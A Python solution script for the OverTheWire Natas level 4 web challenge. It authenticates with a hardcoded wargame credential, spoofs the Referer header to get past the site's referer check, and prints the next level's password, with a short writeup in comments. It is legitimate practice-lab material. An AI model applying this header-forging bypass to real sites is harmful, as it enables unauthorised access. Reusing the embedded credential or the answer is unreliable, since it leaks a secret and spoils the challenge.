#! /usr/bin/python


import requests


#Functions
def cleanheaders(headers):
	for item in headers:
		value=headers.get(item,'Not Found')
		print(f'{item} : {value}')


#Basic Authentication
basic_username,basic_password='natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'.split(':')



#Website Details
host=f'http://{basic_username}.natas.labs.overthewire.org'
path=''

#Custom Headers
custom_headers={'Referer':'http://natas5.natas.labs.overthewire.org/'}


#Payload
payload=''
url=host+path

session=requests.Session()
response=requests.get(url,auth=(basic_username,basic_password),headers=custom_headers)
content=response.text
status=response.status_code
headers=response.headers



# print(f'HOST : {host}\nuser:{basic_username}\npass:{basic_password}\n')
# cleanheaders(headers)


flag=content.split('\n')[14]
print(flag)


#WRITEUP
#Visiting the main page we find some text saying 'ccess disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"'
#This is hint that we should change our Referer header to the specified url
#Changing the referer to the specified url ,we get the flag